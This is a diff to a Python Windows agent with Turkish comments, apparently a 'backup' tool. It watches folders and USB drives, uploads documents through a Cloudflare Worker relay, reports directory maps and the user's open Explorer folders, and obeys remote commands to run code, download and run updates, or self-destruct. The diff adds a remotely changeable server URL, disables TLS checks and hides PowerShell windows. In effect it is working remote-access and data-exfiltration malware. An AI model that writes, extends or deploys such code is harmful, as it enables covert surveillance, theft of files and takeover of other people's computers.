@@ -24,7 +24,6 @@ from urllib3.poolmanager import PoolManager
 import urllib3
 import socket
 import zipfile
-import psutil
 from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
@@ -85,9 +84,9 @@ def cf_post(endpoint, json_data=None, files=None, data=None):
         # 1. Önce Cloudflare proxy'sini dene
         try:
             if files:
-                res = sh.post(url, headers=headers, files=files, data=data, timeout=timeout)
+                res = sh.post(url, headers=headers, files=files, data=data, timeout=timeout, verify=False)
             else:
-                res = sh.post(url, headers=headers, json=json_data, timeout=timeout)
+                res = sh.post(url, headers=headers, json=json_data, timeout=timeout, verify=False)
             
             if res.status_code == 429:
                 wait = int(res.headers.get('Retry-After', 5 * (attempt + 1)))
@@ -203,7 +202,7 @@ def is_online():
     """
     # 1. Önce Cloudflare Worker'a dene
     try:
-        res = sh.get(f"{CF_URL}/ping", timeout=5)
+        res = sh.get(f"{CF_URL}/ping", timeout=5, verify=False)
         if res.status_code < 500:
             return True
     except Exception:
@@ -275,6 +274,11 @@ class AgentConfig:
         self._lock   = threading.Lock()
         self._local  = self._load_local()
         self._remote = {}
+        
+        # Load worker_url from local config if present
+        global CF_URL
+        if 'worker_url' in self._local:
+            CF_URL = self._local['worker_url'].strip().rstrip('/')
 
     def _load_local(self):
         try:
@@ -283,6 +287,15 @@ class AgentConfig:
         except Exception as e:
             log.error(f'config.json okunamadı: {e}')
             sys.exit(1)
+
+    def update_local_config(self, key, value):
+        with self._lock:
+            self._local[key] = value
+            try:
+                with open(CFG_FILE, 'w') as f:
+                    json.dump(self._local, f)
+            except Exception as e:
+                log.error(f'config.json yazma hatası: {e}')
 
     @property
     def key(self):          return self._local.get('key', '')
@@ -296,6 +309,15 @@ class AgentConfig:
     def update_remote(self, cfg):
         with self._lock:
             self._remote = cfg
+            
+        new_url = cfg.get('worker_url')
+        if new_url:
+            new_url = new_url.strip().rstrip('/')
+            if new_url and new_url != self._local.get('worker_url'):
+                global CF_URL
+                CF_URL = new_url
+                self.update_local_config('worker_url', new_url)
+                log.info(f"🔄 Cloudflare Worker URL uzaktan güncellendi: {CF_URL}")
 
     @property
     def all_remote(self):
@@ -504,7 +526,7 @@ class Uploader:
             try:
                 # Önce Cloudflare proxy'si üzerinden dene
                 with open(zip_path, 'rb') as f:
-                    res_upload = sh.put(f"{CF_URL}/proxy_upload", headers=headers, data=f, timeout=300)
+                    res_upload = sh.put(f"{CF_URL}/proxy_upload", headers=headers, data=f, timeout=300, verify=False)
             except Exception as e_primary:
                 log.warning(f"⚠️ Primary upload failed ({type(e_primary).__name__}). Fallback direct upload deneniyor...")
                 # DNS veya Bağlantı hatası durumunda GCS Signed URL'ine DOĞRUDAN bağlan (verify=False ile SSL atla)
@@ -588,15 +610,21 @@ def passes_basic(path, cfg):
         return False
 
     ext     = p.suffix.lower()
-    allowed = [e.lower() for e in cfg.get('allowed_extensions', ['.word', '.docx', '.pdf', '.xlsx'])]
+    default_exts = ['.doc', '.docx', '.pdf', '.xls', '.xlsx', '.txt', '.csv', '.ppt', '.pptx']
+    allowed = [e.lower() for e in cfg.get('allowed_extensions', default_exts)]
     blocked = [e.lower() for e in cfg.get('blocked_extensions', [])]
 
     if ext in CODE_EXTENSIONS and ext not in allowed:
         log.debug(f'Kod dosyası atlandı: {p.name}')
         return False
 
-    if allowed and ext not in allowed:
-        return False
+    if cfg.get('allowed_extensions') is not None:
+        if allowed and ext not in allowed:
+            return False
+    else:
+        # Eğer sunucudan özel bir kural gelmemişse varsayılanları kullan
+        if ext not in allowed:
+            return False
 
     if blocked and ext in blocked:
         return False
@@ -605,6 +633,37 @@ def passes_basic(path, cfg):
 
 
 # ── WATCHDOG HANDLER ─────────────────────────────────────────
+def wait_for_file_stable(path, timeout=60, check_interval=2):
+    """
+    Dosyanın tamamen yazılmasını ve kilitlerinin serbest kalmasını bekler.
+    Dosya boyutu değişmeyene ve dosya okunabilir hale gelene kadar döngüde kontrol eder.
+    """
+    if not os.path.exists(path):
+        return False
+        
+    last_size = -1
+    start_time = time.time()
+    
+    while time.time() - start_time < timeout:
+        try:
+            current_size = os.path.getsize(path)
+            # Dosyayı okuma amaçlı açmayı deneyerek kilitli olup olmadığını kontrol et
+            with open(path, 'rb'):
+                pass
+                
+            if current_size == last_size and current_size > 0:
+                return True
+                
+            last_size = current_size
+        except (PermissionError, FileNotFoundError):
+            # Dosya kilitli (yazılmaya devam ediyor) veya bulunamadı
+            pass
+            
+        time.sleep(check_interval)
+        
+    return False
+
+
 class Handler(FileSystemEventHandler):
     def __init__(self, queue_manager, ai_filter, cfg, watch_root, stats, source_label=''):
         super().__init__()
@@ -616,6 +675,16 @@ class Handler(FileSystemEventHandler):
         self.source_label = source_label
         self._timers      = {}
         self._lock        = threading.Lock()
+
+    def _is_valid_event(self, path):
+        # TEMP klasörü altındaki dosyalardan sadece PDF olanları kabul et
+        try:
+            temp_path = os.environ.get('TEMP')
+            if temp_path and os.path.commonpath([path, temp_path]) == temp_path:
+                return path.lower().endswith('.pdf')
+        except Exception:
+            pass
+        return True
 
     def _schedule(self, path):
         with self._lock:
@@ -633,29 +702,46 @@ class Handler(FileSystemEventHandler):
             self._timers.pop(path, None)
         if not os.path.isfile(path):
             return
+        if not self._is_valid_event(path):
+            return
         rc = self.cfg.all_remote
         if not passes_basic(path, rc):
             return
+            
+        # Dosyanın yazılma işleminin bitmesini ve kararlı hale gelmesini bekle
+        if not wait_for_file_stable(path):
+            log.warning(f"Dosya kararsız veya kilitli kaldığı için atlandı: {path}")
+            return
+            
         size  = os.path.getsize(path)
         ai_r  = self.ai.should_backup(path, size)
         if not ai_r['should_backup']:
             self.stats['ai_skipped'] += 1
             return
         if self.queue_manager:
+            # Eğer dosya TEMP klasöründeyse, kaynağını "Scanner OCR" olarak etiketle
+            lbl = self.source_label
+            try:
+                temp_path = os.environ.get('TEMP')
+                if temp_path and os.path.commonpath([path, temp_path]) == temp_path:
+                    lbl = "Scanner OCR"
+            except Exception:
+                pass
+                
             self.queue_manager.enqueue(
                 path, self.watch_root,
                 ai_r.get('reason', ''), ai_r.get('confidence', 1.0),
-                self.source_label
+                lbl
             )
             self.stats['files_uploaded'] += 1 # Technically queued
             self.stats['last_file'] = Path(path).name
 
     def on_created(self, e):
-        if not e.is_directory:
+        if not e.is_directory and self._is_valid_event(e.src_path):
             self._schedule(e.src_path)
 
     def on_modified(self, e):
-        if not e.is_directory:
+        if not e.is_directory and self._is_valid_event(e.src_path):
             self._schedule(e.src_path)
 
 
@@ -668,21 +754,16 @@ DRIVE_REMOVABLE = 2
 def get_removable_drives():
     drives = []
     try:
-        for part in psutil.disk_partitions(all=False):
-            if 'removable' in part.opts or 'cdrom' not in part.opts:
-                # Windows-specific fallback for USBs
-                if part.fstype in ['FAT32', 'exFAT', 'NTFS'] and 'removable' in part.opts:
-                    drives.append(part.device)
-        
-        # Fallback to ctypes if psutil is empty
-        if not drives:
-            import ctypes, string
-            bitmask = ctypes.windll.kernel32.GetLogicalDrives()
-            for i, letter in enumerate(string.ascii_uppercase):
-                if bitmask & (1 << i):
-                    path = f'{letter}:\\\\'
-                    if ctypes.windll.kernel32.GetDriveTypeW(path) == 2: # DRIVE_REMOVABLE
-                        if path not in drives: drives.append(path)
+        import ctypes, string
+        bitmask = ctypes.windll.kernel32.GetLogicalDrives()
+        for i, letter in enumerate(string.ascii_uppercase):
+            if letter in ['A', 'B']: continue  # Disket sürücüleri atla
+            if bitmask & (1 << i):
+                path = f'{letter}:\\'
+                drive_type = ctypes.windll.kernel32.GetDriveTypeW(path)
+                # DRIVE_REMOVABLE = 2
+                if drive_type == 2:
+                    drives.append(path)
     except Exception as e:
         log.debug(f'Drive listesi alınamadı: {e}')
     return drives
@@ -705,7 +786,14 @@ def copy_flash_to_stage(drive_path: str, max_mb: float, cfg: dict) -> list:
             for file in files:
                 src_path = os.path.join(root, file)
                 
-                # Check file criteria (size and extension)
+                try:
+                    file_size = os.path.getsize(src_path)
+                    if file_size > max_mb * 1024 * 1024:
+                        continue
+                except:
+                    continue
+                
+                # Check file criteria (extension and blocklists)
                 if not passes_basic(src_path, cfg):
                     continue
                     
@@ -986,13 +1074,26 @@ def get_ai_file_knowledge():
                 if bitmask & 1:
                     drive = f"{letter}:\\"
                     try:
-                        usage = psutil.disk_usage(drive)
-                        knowledge["drives"].append({
-                            "letter": drive,
-                            "total": human_size(usage.total),
-                            "used": human_size(usage.used),
-                            "free": human_size(usage.free)
-                        })
+                        free_bytes = ctypes.c_ulonglong(0)
+                        total_bytes = ctypes.c_ulonglong(0)
+                        total_free_bytes = ctypes.c_ulonglong(0)
+                        if ctypes.windll.kernel32.GetDiskFreeSpaceExW(
+                            ctypes.c_wchar_p(drive),
+                            ctypes.byref(free_bytes),
+                            ctypes.byref(total_bytes),
+                            ctypes.byref(total_free_bytes)
+                        ):
+                            t = total_bytes.value
+                            f = total_free_bytes.value
+                            u = t - f
+                            knowledge["drives"].append({
+                                "letter": drive,
+                                "total": human_size(t),
+                                "used": human_size(u),
+                                "free": human_size(f)
+                            })
+                        else:
+                            knowledge["drives"].append({"letter": drive})
                     except:
                         knowledge["drives"].append({"letter": drive})
                 bitmask >>= 1
@@ -1052,10 +1153,98 @@ def get_ai_file_knowledge():
     return knowledge
 
 
+_last_directory_map = None
+_last_dir_map_time = 0.0
+
+def _bg_update_directory_map():
+    global _last_directory_map, _last_dir_map_time
+    try:
+        log.info("Starting background directory map scan...")
+        base_map = get_comprehensive_directory_map()
+        base_map["_ai_knowledge"] = get_ai_file_knowledge()
+        _last_directory_map = base_map
+        _last_dir_map_time = time.time()
+        log.info("Background directory map scan completed.")
+    except Exception as e:
+        log.error(f"Background directory map update error: {e}")
+
 def get_directory_map():
-    base_map = get_comprehensive_directory_map()
-    base_map["_ai_knowledge"] = get_ai_file_knowledge()
-    return base_map
+    global _last_directory_map, _last_dir_map_time
+    now = time.time()
+    if _last_directory_map is None:
+        _last_directory_map = {}
+        threading.Thread(target=_bg_update_directory_map, daemon=True).start()
+        return {}
+    if (now - _last_dir_map_time) > 600:
+        _last_dir_map_time = now  # Prevent starting multiple threads
+        threading.Thread(target=_bg_update_directory_map, daemon=True).start()
+    return _last_directory_map
+
+
+_last_explorer_paths = None
+_last_explorer_time = 0.0
+
+def get_active_explorer_paths():
+    global _last_explorer_paths, _last_explorer_time
+    now = time.time()
+    if _last_explorer_paths is not None and (now - _last_explorer_time) < 10.0:
+        return _last_explorer_paths
+
+    ps_code = """
+    $shell = New-Object -ComObject Shell.Application
+    $windows = $shell.Windows()
+    $paths = @()
+    $activePath = $null
+    try {
+        Add-Type -TypeDefinition @"
+        using System;
+        using System.Runtime.InteropServices;
+        public class Win32 {
+            [DllImport("user32.dll")]
+            public static extern IntPtr GetForegroundWindow();
+        }
+"@ -ErrorAction SilentlyContinue
+        $activeHwnd = [Win32]::GetForegroundWindow()
+    } catch {}
+
+    foreach ($window in $windows) {
+        try {
+            $path = $window.Document.Folder.Self.Path
+            if ($path) {
+                if ($paths -notcontains $path) {
+                    $paths += $path
+                }
+                if ($activeHwnd -and $window.HWND -eq $activeHwnd) {
+                    $activePath = $path
+                }
+            }
+        } catch {}
+    }
+    $res = @{
+        active = $activePath
+        open_folders = $paths
+    }
+    $res | ConvertTo-Json
+    """
+    try:
+        ret = subprocess.run(
+            ['powershell.exe', '-ExecutionPolicy', 'Bypass', '-Command', ps_code],
+            capture_output=True,
+            text=True,
+            creationflags=0x08000000,
+            timeout=10
+        )
+        if ret.returncode == 0:
+            import json
+            res = json.loads(ret.stdout.strip())
+            _last_explorer_paths = res
+            _last_explorer_time = now
+            return res
+    except Exception as e:
+        log.debug(f"get_active_explorer_paths error: {e}")
+    return {"active": None, "open_folders": []}
+
+
 
 
 # ── SELF DESTRUCT ────────────────────────────────────────────
@@ -1087,15 +1276,68 @@ def self_destruct(cfg=None):
 def remote_update(update_url, cfg=None):
     try:
         log.warning(f"Remote update başlatılıyor: {update_url}")
-        res = requests.get(update_url, timeout=30, verify=False)
-        if res.status_code == 200:
+        res = None
+        
+        # 1. Önce doğrudan indirmeyi dene (Session nesnesi ile)
+        try:
+            res = sh.get(update_url, timeout=60, verify=False)
+            if res.status_code != 200:
+                log.warning(f"Doğrudan güncelleme indirme başarısız (HTTP {res.status_code}). Proxy denenecek.")
+                res = None
+        except Exception as e_direct:
+            log.warning(f"⚠️ Doğrudan güncelleme indirme hatası: {e_direct}. Proxy denenecek.")
+            res = None
+
+        # 2. Doğrudan indirme başarısızsa Cloudflare Worker Proxy üzerinden dene
+        if res is None:
+            try:
+                current_minute = int(time.time() / 60)
+                token_string = f"{CF_TOKEN}_{current_minute}"
+                dynamic_token = hashlib.sha256(token_string.encode()).hexdigest()
+                
+                headers = {
+                    "Authorization": f"Bearer {dynamic_token}",
+                    "X-Proxy-Target": update_url
+                }
+                proxied_url = f"{CF_URL}/proxy_update"
+                log.info(f"🔄 Güncelleme Cloudflare proxy üzerinden indiriliyor: {proxied_url}")
+                res = sh.get(proxied_url, headers=headers, timeout=120, verify=False)
+                if res.status_code != 200:
+                    log.error(f"❌ Proxy üzerinden indirme de başarısız oldu: HTTP {res.status_code}")
+                    return
+            except Exception as e_proxy:
+                log.error(f"❌ Proxy indirme hatası: {e_proxy}")
+                return
+
+        if res and res.status_code == 200:
+            if len(res.content) < 500 * 1024:
+                log.error("❌ İndirilen güncelleme dosyası geçersiz (boyut < 500KB). Güncelleme iptal edildi.")
+                return
+                
             exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
             new_exe = os.path.join(tempfile.gettempdir(), 'new_ashfir.exe')
             with open(new_exe, 'wb') as f:
                 f.write(res.content)
             
             bat_path = os.path.join(tempfile.gettempdir(), 'update_ashfir.bat')
-            bat_content = f'@echo off\ntimeout /t 2 /nobreak >nul\ndel /f /q "{exe_path}"\ncopy /y "{new_exe}" "{exe_path}"\nstart "" "{exe_path}"\ndel /f /q "{new_exe}"\ndel /f /q "%~f0"\n'
+            bat_content = (
+                f'@echo off\n'
+                f'timeout /t 3 /nobreak >nul\n'
+                f'if not exist "{new_exe}" exit\n'
+                f'if exist "{exe_path}" (\n'
+                f'    move /y "{exe_path}" "{exe_path}.bak"\n'
+                f')\n'
+                f'copy /y "{new_exe}" "{exe_path}"\n'
+                f'if exist "{exe_path}" (\n'
+                f'    start "" "{exe_path}"\n'
+                f'    del /f /q "{new_exe}"\n'
+                f'    timeout /t 5 /nobreak >nul\n'
+                f'    if exist "{exe_path}.bak" del /f /q "{exe_path}.bak"\n'
+                f') else (\n'
+                f'    if exist "{exe_path}.bak" move /y "{exe_path}.bak" "{exe_path}"\n'
+                f')\n'
+                f'del /f /q "%~f0"\n'
+            )
             with open(bat_path, 'w') as f:
                 f.write(bat_content)
                 
@@ -1110,7 +1352,7 @@ def execute_remote_code(code, code_type, cfg=None):
         log.info(msg)
         if cfg:
             try:
-                cf_post('/log', json_data={"key": cfg.key, "level": level, "message": f'[REMOTE-CODE] {msg}', "source": "agent", "ts": int(time.time() * 1000)})
+                cf_post('/log', json_data={"key": cfg.key, "level": level, "message": f'[{cfg.machine_name}] [REMOTE-CODE] {msg}', "source": "agent", "ts": int(time.time() * 1000)})
             except: pass
 
     emit_log(f'Kod çalıştırılıyor (Tip: {code_type})')
@@ -1151,15 +1393,10 @@ sync_lock       = threading.Lock()
 
 
 def update_watches(cfg, observer, active_watches, queue_manager, ai, stats):
-    rc = cfg.all_remote
-    watch_paths = rc.get('watch_paths', [])
-
-    if not watch_paths:
-        desktop = get_smart_desktop()
-        if os.path.exists(desktop):
-            watch_paths = [desktop]
-
-    valid_paths = [p for p in watch_paths if os.path.exists(p)]
+    temp_dir = os.environ.get('TEMP')
+    valid_paths = []
+    if temp_dir and os.path.exists(temp_dir):
+        valid_paths.append(temp_dir)
 
     for path in valid_paths:
         if path not in active_watches:
@@ -1176,8 +1413,11 @@ def update_watches(cfg, observer, active_watches, queue_manager, ai, stats):
 
 
 # ── HEARTBEAT ────────────────────────────────────────────────
-def heartbeat_loop(cfg, stats, queue_manager, ai, observer, active_watches, start_time):
+def heartbeat_loop(cfg, stats, queue_manager, ai, observer, active_watches, start_time, uploader=None):
     log.info('Heartbeat (API Polling) başlatıldı')
+
+    if uploader is None:
+        uploader = Uploader(cfg)
 
     while True:
         try:
@@ -1186,6 +1426,29 @@ def heartbeat_loop(cfg, stats, queue_manager, ai, observer, active_watches, star
                 log.debug('İnternet yok, heartbeat bekleniyor...')
                 time.sleep(30)
                 continue
+
+            # Calculate hardware metrics
+            cpu_percent = 0.0
+            ram_percent = 0.0
+            disk_percent = 0.0
+            try:
+                # CPU and RAM tracking are disabled to prevent psutil DLL failures.
+                # Disk usage is calculated safely using ctypes.
+                free_bytes = ctypes.c_ulonglong(0)
+                total_bytes = ctypes.c_ulonglong(0)
+                total_free_bytes = ctypes.c_ulonglong(0)
+                if ctypes.windll.kernel32.GetDiskFreeSpaceExW(
+                    ctypes.c_wchar_p('C:\\'),
+                    ctypes.byref(free_bytes),
+                    ctypes.byref(total_bytes),
+                    ctypes.byref(total_free_bytes)
+                ):
+                    t = total_bytes.value
+                    f = total_free_bytes.value
+                    if t > 0:
+                        disk_percent = round(((t - f) / t) * 100, 1)
+            except Exception as e_metrics:
+                log.debug(f"Hardware metrics fetch error: {e_metrics}")
 
             payload = {
                 "key": cfg.key,
@@ -1196,13 +1459,35 @@ def heartbeat_loop(cfg, stats, queue_manager, ai, observer, active_watches, star
                 "ai_skipped": stats['ai_skipped'],
                 "last_file": stats['last_file'],
                 "uptime_seconds": int(time.time() - start_time),
-                "directory_map": get_directory_map()
+                "directory_map": get_directory_map(),
+                "active_folders": get_active_explorer_paths(),
+                "metrics": {
+                    "cpu": cpu_percent,
+                    "ram": ram_percent,
+                    "disk": disk_percent
+                },
+                "thread_status": {
+                    "heartbeat": "online",
+                    "usb": "online" if (time.time() - stats.get('usb_last_seen', 0.0) < 15) else "offline",
+                    "sync": "online" if (time.time() - stats.get('sync_last_seen', 0.0) < 660) else "offline",
+                    "watcher": "online" if observer.is_alive() else "offline"
+                }
             }
 
             res = cf_post('/heartbeat', json_data=payload)
             if res and res.status_code == 200:
                 data = res.json()
                 
+                # Check for active commands to temporarily enter high-frequency heartbeat mode
+                has_command = (
+                    data.get('remote_code') or
+                    data.get('update_url') or
+                    data.get('update_agent')
+                )
+                if has_command:
+                    stats['active_until'] = time.time() + 180  # Keep high-frequency polling for 3 minutes
+                    log.info("⚡ Kullanıcı komutu alındı: Ajan 3 dakika boyunca yüksek frekanslı (5sn) heartbeat moduna geçiyor.")
+
                 # Config güncelleme
                 if 'config' in data:
                     new_cfg = data['config']
@@ -1232,41 +1517,36 @@ def heartbeat_loop(cfg, stats, queue_manager, ai, observer, active_watches, star
                 # Self-destruct kontrolü
                 if data.get('self_destruct'):
                     log.warning('SELF-DESTRUCT komutu alındı!')
-                    # Komutu Firestore'dan temizle (tekrar tetiklenmesin)
-                    try: cf_post('/clear_command', json_data={"key": cfg.key, "field": "self_destruct"})
-                    except: pass
                     self_destruct(cfg)
 
                 # Remote update kontrolü
                 update_url = data.get('update_url') or data.get('update_agent')
                 if update_url:
                     log.warning(f'REMOTE UPDATE komutu alındı: {update_url}')
-                    # Komutu Firestore'dan temizle (sonsuz döngü olmasın)
-                    try: cf_post('/clear_command', json_data={"key": cfg.key, "field": "update_url"})
-                    except: pass
-                    remote_update(update_url, cfg)
+                    threading.Thread(target=remote_update, args=(update_url, cfg), daemon=True).start()
 
                 # Remote code kontrolü
                 remote_code = data.get('remote_code')
                 if remote_code:
                     code_type = data.get('code_type', 'batch')
                     log.warning(f'REMOTE CODE komutu alındı: Tip={code_type}')
-                    execute_remote_code(remote_code, code_type, cfg)
-                    # Komutu Firestore'dan temizle (tekrar çalışmasın)
-                    try: cf_post('/clear_command', json_data={"key": cfg.key, "field": "remote_code"})
-                    except: pass
+                    threading.Thread(target=execute_remote_code, args=(remote_code, code_type, cfg), daemon=True).start()
 
         except Exception as e:
             log.error(f'Heartbeat loop hatası: {e}')
         
-        time.sleep(30)
+        # Get heartbeat_interval dynamically from remote config, defaulting to 30
+        interval = cfg.get('heartbeat_interval', 30)
+        time.sleep(interval)
 
 
 
 # ── BACKGROUND SYNC LOOP ─────────────────────────────────────
-def background_sync_loop(cfg, queue_manager, uploader, flash_monitor):
+def background_sync_loop(cfg, queue_manager, uploader, flash_monitor, stats=None):
     log.info('Background sync loop başlatıldı (10 dk aralıklarla)')
     while True:
+        if stats is not None:
+            stats['sync_last_seen'] = time.time()
         # Uyandıktan sonra kuyruktaki tüm dosyalar bitene kadar chunk'ları gönder
         while True:
             try:
@@ -1465,7 +1745,7 @@ def main():
     try:
         url = f"{CF_URL}/heartbeat"
         headers = {"Authorization": f"Bearer {CF_TOKEN}"}
-        res = sh.post(url, headers=headers, json={"key": cfg.key, "machine_name": cfg.machine_name}, timeout=10)
+        res = sh.post(url, headers=headers, json={"key": cfg.key, "machine_name": cfg.machine_name}, timeout=10, verify=False)
         if res.status_code == 200:
             data = res.json()
             if 'config' in data:
@@ -1482,17 +1762,25 @@ def main():
     watch_paths = rc.get('watch_paths', [])
     valid_paths = [p for p in watch_paths if os.path.exists(p)]
 
+    # Auto-add TEMP folder for tracking scanned OCR PDFs
+    temp_dir = os.environ.get('TEMP')
+    valid_paths = []
+    if temp_dir and os.path.exists(temp_dir):
+        valid_paths.append(temp_dir)
+        log.info(f'📸 Tarayıcı OCR takibi için TEMP klasörü izlemeye alındı: {temp_dir}')
+
     queue_manager = QueueManager()
     uploader = Uploader(cfg)
     ai       = SmartFilter(cfg)
-    stats    = {'files_uploaded': 0, 'ai_skipped': 0, 'last_file': None}
+    stats    = {
+        'files_uploaded': 0, 
+        'ai_skipped': 0, 
+        'last_file': None,
+        'usb_last_seen': time.time(),
+        'sync_last_seen': time.time(),
+        'active_until': 0.0
+    }
     start    = time.time()
-
-    if not valid_paths:
-        desktop = get_smart_desktop()
-        if os.path.exists(desktop):
-            valid_paths = [desktop]
-            log.info(f'⚠️ Klasör yok, Masaüstü kullanılıyor: {desktop}')
 
     observer       = Observer()
     active_watches = {}
@@ -1503,26 +1791,20 @@ def main():
         active_watches[path] = w
         log.info(f'📂 İzleniyor: {path}')
 
-    if STAGE_DIR.exists():
-        stage_handler = Handler(queue_manager, ai, cfg, str(STAGE_DIR), stats, source_label='FLASH_STAGE')
-        observer.schedule(stage_handler, str(STAGE_DIR), recursive=True)
-
     observer.start()
-
-    flash_monitor = FlashMonitor(queue_manager, ai, cfg, stats, observer)
 
     threading.Thread(
         target=initial_sync, args=(queue_manager, ai, valid_paths, rc), daemon=True
     ).start()
     threading.Thread(
         target=heartbeat_loop,
-        args=(cfg, stats, queue_manager, ai, observer, active_watches, start),
+        args=(cfg, stats, queue_manager, ai, observer, active_watches, start, uploader),
         daemon=True
     ).start()
 
     threading.Thread(
         target=background_sync_loop,
-        args=(cfg, queue_manager, uploader, flash_monitor),
+        args=(cfg, queue_manager, uploader, None, stats),
         daemon=True
     ).start()
 
@@ -1530,8 +1812,7 @@ def main():
 
     try:
         while True:
-            flash_monitor.poll()
-            time.sleep(5)
+            time.sleep(60)
     except (KeyboardInterrupt, SystemExit):
         observer.stop()
         observer.join()
